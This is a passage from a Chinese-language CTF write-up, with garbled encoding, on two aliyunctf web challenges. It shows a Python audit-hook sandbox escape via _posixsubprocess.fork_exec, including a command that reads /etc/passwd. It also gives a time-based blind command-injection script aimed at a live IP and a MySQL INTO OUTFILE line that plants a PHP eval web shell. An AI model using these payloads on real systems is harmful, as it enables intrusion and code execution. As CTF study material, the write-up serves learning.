\u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Problem ID {problem_id} not found!\u0026#34;} ), 404, ) code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) result = judge(code_filename, problem_dir) code_filename.unlink() return jsonify(result) except Exception as e: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: str(e)}), 500 def judge(code_filename, problem_dir): test_files = sorted(problem_dir.glob(\u0026#34;*.input\u0026#34;)) total_tests = len(test_files) passed_tests = 0 try: for test_file in test_files: input_file = test_file expected_output_file = problem_dir / f\u0026#34;{test_file.stem}.output\u0026#34; if not expected_output_file.exists(): continue case_passed = run_code(code_filename, input_file, expected_output_file) if case_passed: passed_tests += 1 if passed_tests == total_tests: return {\u0026#34;status\u0026#34;: \u0026#34;AC\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Accepted\u0026#34;} else: return { \u0026#34;status\u0026#34;: \u0026#34;WA\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Wrang Answer: pass({passed_tests}/{total_tests})\u0026#34;, } except OJRuntimeError as e: return {\u0026#34;status\u0026#34;: \u0026#34;RE\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Runtime Error: ret={e.args[0]}\u0026#34;} except OJTimeLimitExceed: return {\u0026#34;status\u0026#34;: \u0026#34;TLE\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Time Limit Exceed\u0026#34;} def run_code(code_filename, input_file, expected_output_file): with open(input_file, \u0026#34;r\u0026#34;) as infile, open( expected_output_file, \u0026#34;r\u0026#34; ) as expected_output: expected_output_content = expected_output.read().strip() process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) except subprocess.TimeoutExpired: process.kill() raise OJTimeLimitExceed if process.returncode != 0: raise OJRuntimeError(process.returncode) if stdout.strip() == expected_output_content: return True else: return False if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) å®¡è®¡ä»£ç ï¼Œå…³é”®ä»£ç å°±æ˜¯ä¼ å‚ï¼Œç„¶åå¯ä»¥å¾€pythonæ–‡ä»¶å†™pythonä»£ç ï¼Œä½†æ˜¯è®¾ç½®äº†auditæ²™ç®±ï¼Œç®€å•è¯´å‡ ä¸ªå…³é”®ä»£ç ï¼Œå†™å…¥æ–‡ä»¶çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) è¿™é‡Œå°±æ˜¯ä»postä¼ å‚æ¥è·å–åˆ°codeçš„å€¼ï¼Œè®©ç„¶åæ‹¼æ¥CODE_TEMPLATEå†™å…¥åˆ°ä¸€ä¸ªpythonæ–‡ä»¶ã€‚\nè¿è¡Œpythonæ–‡ä»¶ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) å°±æ˜¯æ‰§è¡Œpythonæ–‡ä»¶ã€‚å¯ä»¥è¿›è¡Œå¯¹pythonæ–‡ä»¶å†…å®¹è¿›è¡Œä»£ç æ³¨å…¥ï¼Œçœ‹æ‹¼æ¥çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; audit hookæ²™ç®±ï¼Œå°±æ˜¯é™åˆ¶äº†syså¯¹è¿›ç¨‹çš„ä¸€äº›åŠ è½½ä»¥åŠåˆ©ç”¨ã€‚å¯ä»¥çœ‹åˆ°æ˜¯å…è®¸importæ“ä½œï¼Œä»¥åŠtimeæ¨¡å—çš„sleepæ–¹æ³•ç­‰ï¼Œè¿™é‡Œå°±æ˜¯audithookæ²™ç®±ï¼Œå¯ä»¥æ‰“æ²™ç®±é€ƒé€¸ï¼Œåœ¨auditæ²™ç®±é€ƒé€¸ä¸­ï¼Œéå¸¸ç»å…¸çš„å°±æ˜¯ä½¿ç”¨fok_exec()å‡½æ•°ï¼Œå³åˆ©ç”¨_posixsubprocessæ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªç®€å•çš„payloadå¦‚ä¸‹ï¼š\n1 2 3 4 import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;cat /etc/passwd\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) å¯ä»¥æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;ls /\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š\næˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚\nä½†æ˜¯ç°åœ¨å°±éœ€è¦æƒ³åœ¨é¢˜ç›®ä¸­æ€ä¹ˆåˆ©ç”¨ã€‚\né¢˜ç›®æè¿°è¯´äº†ç¯å¢ƒä¸å‡ºç½‘ã€‚é‚£å°±æ‰“å‘½ä»¤ç›²æ³¨ã€‚å‚è€ƒåˆ°ä¹‹å‰çš„è„šæœ¬ç¨å¾®æ”¹æ”¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import requests import time url = \u0026#34;http://121.41.238.106:13847/api/submit\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-\u0026#34; result = \u0026#34;\u0026#34; for i in range(1, 5): # å‡è®¾æœ‰ 4 è¡Œ print(f\u0026#34;ç¬¬{i}è¡Œ\u0026#34;) for j in range(1, 7): # å‡è®¾æ¯è¡Œæœ€å¤š 7ä¸ªå­—ç¬¦ for char in charset: # é™åˆ¶å­—ç¬¦èŒƒå›´ä¸ºå­—æ¯å’Œæ•°å­— json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(ls / | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } try: start_time = time.time() res = requests.post(url, json=json_data) end_time = time.time() delay = end_time - start_time if delay \u0026gt; 2: result += char print(f\u0026#34;å½“å‰ç»“æœ: {result}\u0026#34;) break except Exception as e: print(f\u0026#34;è¯·æ±‚å¤±è´¥: {e}\u0026#34;) continue result += \u0026#34; \u0026#34; print(\u0026#34;æœ€ç»ˆç»“æœ:\u0026#34;) print(result) å°±æ˜¯æœ‰ç‚¹æ…¢ï¼Œä¸€ç›´ç­‰ç€è·‘ï¼š\nè¿˜æ²¡è·‘å‡ºæ¥flagæ–‡ä»¶åç§°ï¼Œç®€å•æ”¹ä¸€ä¸‹içš„èŒƒå›´å³å¯ï¼Œç„¶åç»§ç»­è·‘ï¼Œè·‘å‡ºæ¥ä¸€ä¸ªflag-9çš„åç§°ï¼š\nç›´æ¥ç”¨é€šé…ç¬¦*åŒ¹é…ç„¶åè¯»å–å†…å®¹ï¼Œæ³¨æ„å°†jçš„å€¼æ”¹å¤§ç‚¹ï¼Œç®€å•æ”¹æ”¹å°±è¡Œäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # å‡è®¾æœ‰ 4 è¡Œ print(f\u0026#34;ç¬¬{i}è¡Œ\u0026#34;) for j in range(1, 30): # å‡è®¾æ¯è¡Œæœ€å¤š 7 ä¸ªå­—ç¬¦ for char in charset: # é™åˆ¶å­—ç¬¦èŒƒå›´ä¸ºå­—æ¯å’Œæ•°å­— json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } çˆ†å‡ºæ¥ï¼š\n1 aliyunctf{076d4662-656b-4889- é•¿åº¦ä¸å¤Ÿï¼Œå†æ”¹ç‚¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # å‡è®¾æœ‰ 4 è¡Œ print(f\u0026#34;ç¬¬{i}è¡Œ\u0026#34;) for j in range(30, 60): # å‡è®¾æ¯è¡Œæœ€å¤š 7 ä¸ªå­—ç¬¦ for char in charset: # é™åˆ¶å­—ç¬¦èŒƒå›´ä¸ºå­—æ¯å’Œæ•°å­— json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } ç„¶åå†çˆ†å‡ºæ¥ï¼š\n1 ac30-77bb8c19fefa} ç›´æ¥æ‹¼æ¥åˆ°äº¤å°±è¡Œäº†ï¼š\n1 aliyunctf{076d4662-656b-4889-ac30-77bb8c19fefa} â€”â€”â€”â€”â€”â€”\næ‰“å¡OK æ²¡å†™å¥½çš„ç³»ç»Ÿæ€ä¹ˆä¼šæ‰“å¡okå‘¢~\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜ï¼Œè·³è½¬åˆ°äº†login.phpï¼Œåç«¯æ˜¯phpï¼Œæ‰«ç›®å½•ï¼š\nåœ¨index.php~æ–‡ä»¶ä¸­æ‹¿åˆ°äº†index.phpæ–‡ä»¶æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php session_start(); if($_SESSION[\u0026#39;login\u0026#39;]!=1){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Please login!\\\u0026#34;);window.location.href=\\\u0026#34;./login.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; return ; } ?\u0026gt; \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; }else{ include \u0026#39;error.php\u0026#39;; } } ?\u0026gt; è¿˜æ˜¯æ˜¾ç¤ºå¿…é¡»è¦ç™»å½•ï¼Œä½†æ˜¯åœ¨ç™»å½•æ¡†æœ‰ä¸€ä¸ªcodeï¼Œä¸çŸ¥é“æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œä¹Ÿçˆ†ç ´ä¸äº†ã€‚åé¢å‘ç°å…¶å®å¯ä»¥ä»»æ„è¯»å–æ–‡ä»¶æºç ï¼Œç±»ä¼¼xxxx.php~è¿™æ ·æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œéƒ¨åˆ†æ–‡ä»¶çš„æ–‡ä»¶æ³„éœ²ï¼Œä¸‹é¢è´´ä¸€ä¸‹æ–‡ä»¶å†…å®¹è£ï¼Œè¿™é‡Œå°±åªä¿ç•™phpä»£ç äº†ï¼š\nlogin.phpæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;web\u0026#34;; $password = \u0026#34;web\u0026#34;; $dbname = \u0026#34;web\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#34;è¿æ¥å¤±è´¥: \u0026#34; . $conn-\u0026gt;connect_error); } session_start(); include \u0026#39;./pass.php\u0026#39;; if(isset($_POST[\u0026#39;username\u0026#39;]) and isset($_POST[\u0026#39;password\u0026#39;])){ $username=addslashes($_POST[\u0026#39;username\u0026#39;]); $password=$_POST[\u0026#39;password\u0026#39;]; $code=$_POST[\u0026#39;code\u0026#39;]; $endpass=md5($code.$password).\u0026#39;:\u0026#39;.$code; $sql = \u0026#34;select password from users where username=\u0026#39;$username\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { if($endpass==$row[\u0026#39;password\u0026#39;]){ $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;username\u0026#39;] = md5($username); echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Welcome $username!\\\u0026#34;);window.location.href=\\\u0026#34;./index.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; } } } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;é”™è¯¯\\\u0026#34;);\u0026lt;/script\u0026gt;\u0026#34;; die(); } $conn-\u0026gt;close(); } ?\u0026gt; pass.phpæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class mypass { public function generateRandomString($length = 10) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } public function checkpass($plain) { $password = $this-\u0026gt;generateRandomString(); $salt = substr(md5($password), 0, 5); $password = md5($salt . $plain) . \u0026#39;:\u0026#39; . $salt; return $password; } } cache.phpæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class myCache { public function writecache($name,$data) { $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $data; file_put_contents($file,$cachedata); return \u0026#39;\u0026#39;; } } class checkin{ function writec($data,$name) { $wr=new myCache(); $wr-\u0026gt;writecache($data,$name); } } ?\u0026gt; å®¡è®¡ä»£ç ï¼Œå¯ä»¥å‘ç°åœ¨index.phpæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„æ“ä½œå¦ä¸€ä¸ªphpæ–‡ä»¶çš„æ“ä½œã€‚\nç®€å•è¯´è¯´index.phpæ–‡ä»¶é€»è¾‘ï¼Œåºåˆ—åŒ–æ“ä½œï¼Œæ˜¯åºåˆ—åŒ–äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ¡ˆåå°†å…¶å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆé›†åˆindex.phpå’Œcache.phpæ–‡ä»¶æ¥çœ‹ï¼‰ï¼Œå¯ä»¥ç®€å•å†™ä¸€ä¸ªä»£ç æ¥çœ‹ä¸€ä¸‹å†™æ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼š\n1 2 3 4 5 6 7 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;123\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#34;11112\u0026#34;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); æ–‡ä»¶fupanc-2025-02-23.phpæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} å°±æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œåªæ˜¯å‰é¢æ’å…¥äº†ä¸€æ®µphpæ–‡ä»¶ï¼Œä¼°è®¡æ˜¯é˜²æ­¢ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œæ­»äº¡exitä¹Ÿç»•ä¸äº†ï¼Œæ–‡ä»¶åä¸å¯æ§ï¼š\n1 $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; ç„¶åçœ‹å…¶ä»–index.phpçš„å…¶ä»–ä»£ç ï¼Œå¯ä»¥è¯»å‡ºæ–‡ä»¶è¯»å–æ“ä½œå’Œååºåˆ—åŒ–æ“ä½œï¼Œè¿˜æœ‰ä¸ªå­—ç¬¦ä¸²æ›¿æ¢æ“ä½œï¼š\n1 2 3 4 5 6 7 $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } è¿™é‡Œå…¶å®å°±æ˜¯å°†æ’å…¥çš„\u0026lt;?php exit;//æ›¿æ¢ä¸ºç©ºï¼Œç„¶åååºåˆ—åŒ–ï¼Œå°±æ˜¯ååºåˆ—åŒ–ä¸ºæ•°ç»„ï¼Œç„¶åè¯»å–æ•°ç»„ä¸­çš„å†…å®¹ï¼Œå†åŒ…å«å®ƒã€‚ä»å‰é¢çš„åºåˆ—åŒ–çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œå°±æ˜¯åŒ…å«ok.phpçš„å†…å®¹ï¼Œè®¿é—®æ²¡æœ‰ä¸œè¥¿ï¼Œè¿˜æ˜¯ç›´æ¥çœ‹æºç ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š\n1 2 \u0026lt;?php echo \u0026#39;ok\u0026#39;;?\u0026gt; //adminer_481.php è®¿é—®å°±æ˜¯mysqlçš„è¿æ¥æ“ä½œï¼š\næœ‰ç‚¹ç±»ä¼¼æ•°æ®åº“æ“ä½œçš„å†…å®¹ï¼Œä½†æ˜¯è¿™é‡Œå°±æ²¡è·å–åˆ°æºç ï¼š\nåœ¨login.phpæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°æ•°æ®åº“åä»¥åŠå¯†ç ç­‰ä¿¡æ¯ï¼Œç›´æ¥ç™»å½•çœ‹çœ‹ï¼š\nå¯ä»¥æŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶ï¼Œä»¥åŠå¯ä»¥æ‰§è¡Œsqlè¯­å¥ã€‚ä¹Ÿå°è¯•äº†into outfileå’Œæ—¥å¿—å†™é©¬ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰æˆåŠŸã€‚åº”è¯¥æ˜¯æ²¡æœ‰æƒé™ã€‚\nå†çœ‹index.phpä»£ç ï¼Œåœ¨isset($_POST['reason'])çš„ä»£ç å—ä¸­ï¼Œè¿™ä¸ªtimeä¼¼ä¹æ˜¯å¯æ§çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } é‚£ä¹ˆæ˜¯å¦å¯ä»¥æ‰“å­—ç¬¦ä¸²é€ƒé€¸å‘¢ï¼Œç›´æ¥æ§åˆ¶timeçš„å€¼ä¸º\u0026lt;?php exit;//çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¹¶ä¸”è¿™é‡Œçš„reasonå˜é‡ä¹Ÿæ˜¯å¯æ§çš„ï¼Œè¿™æ ·çš„è¯å°±æ˜¯æ‰“å­—ç¬¦ä¸²é€ƒé€¸ï¼ˆå‡å°‘ï¼‰ï¼Œç„¶ååŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œæµ‹è¯•ä¸€ä¸‹dataå‡½æ•°çš„è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\u0026lt;?php exit;//\u0026#34;; echo date($a).PHP_EOL; echo date($b); //output: 111 \u0026lt;?Z08Z UTC20255228;// ä¸å¯æ§ï¼Œæ‰“ä¸äº†ï¼Œdate()å‡½æ•°ä¼šã€‚\nè¿˜æ˜¯éœ€è¦æ‰“å…¶ä»–çš„æ–¹æ³•ã€‚\nå°è¯•ä¸€ä¸‹rootçš„ä¸€èˆ¬çš„é»˜è®¤å¯†ç rootï¼Œç›´æ¥ç™»è¿›å»äº†ï¼š\næˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š\nå°è¯•å†™é©¬ï¼š\n1 select \u0026#39;\u0026lt;?php echo 123; @eval($_POST[123]); ?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/shell.php\u0026#39; æˆåŠŸæ‰§è¡Œ:\nè®¿é—®1.phpï¼ŒæˆåŠŸæ‰§è¡Œï¼š\nå¾—åˆ°flag:\n1 aliyunctf{a9d1e1d9-53d5-4d10-a96b-361d693fb502} â€”â€”â€”â€”â€”â€”\næœ€åçœ‹äº†ä¸€ä¸‹å®˜æ–¹wpã€‚ä¸Šé¢çš„æ˜¯å½“æ—¶æ‰“å‡ºæ¥çš„éé¢„æœŸè§£æ³•ã€‚ä¸‹é¢æ¥ç®€å•è¯´è¯´é¢„æœŸè§£æ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ‰“pearcmdæ–‡ä»¶åŒ…å«ï¼Œä¸»è¦è¿˜æ˜¯è¿™é‡Œçš„date()å‡½æ•°çš„ç»•è¿‡ï¼Œåœ¨å‰é¢çš„phpæµ‹è¯•ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯æœ‰å­—æ¯æˆ–å…¶ä»–ç¬¦å·ï¼Œä¼šæ¯è¾“å‡ºä¸ºå…¶ä»–å†…å®¹ã€‚ä½†æ˜¯è¿™é‡Œå¯ä»¥ä½¿ç”¨åæ–œæ æ¥ç»•è¿‡ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\\\u0026lt;\\?\\p\\h\\p\\ \\\\e\\x\\i\\\\t\\;\\/\\/\u0026#34;; echo date($a).PHP_EOL; echo date($b); /*output: 111 \u0026lt;?php exit;// */ ç”±äºphpçš„ç‰¹æ€§ï¼Œè¿™é‡Œçš„\\eå’Œ\\tæ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥å¤šæ‹¿ä¸€ä¸ª\\æ¥å°†å‰é¢çš„ç»™è½¬ä¹‰ï¼Œè®©å…¶ä¸è¢«è§£æä¸ºç‰¹æ®Šå­—ç¬¦ã€‚\nä»è¾“å‡ºç»“æœå¯ä»¥çœ‹å‡ºæ¥æˆåŠŸè¾“å‡ºæƒ³è¦çš„å†…å®¹ã€‚å†åŠ ä¸Šå‰é¢è¯´çš„timeå˜é‡æ˜¯å¯æ§çš„ï¼Œå†åŠ ä¸Šreasonå˜é‡å¯æ§ï¼Œè¿™é‡Œå°è¯•å¦‚ä¸‹åŒ…å«pearcmdæ–‡ä»¶å†…å®¹ï¼Œç®€å•æ¥æ„é€ ä¸€ä¸‹ï¼š\næ­£å¸¸çš„å†…å®¹å¤§æ¦‚å¦‚ä¸‹ï¼š\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} ç„¶åä¼šå°†\u0026lt;?php 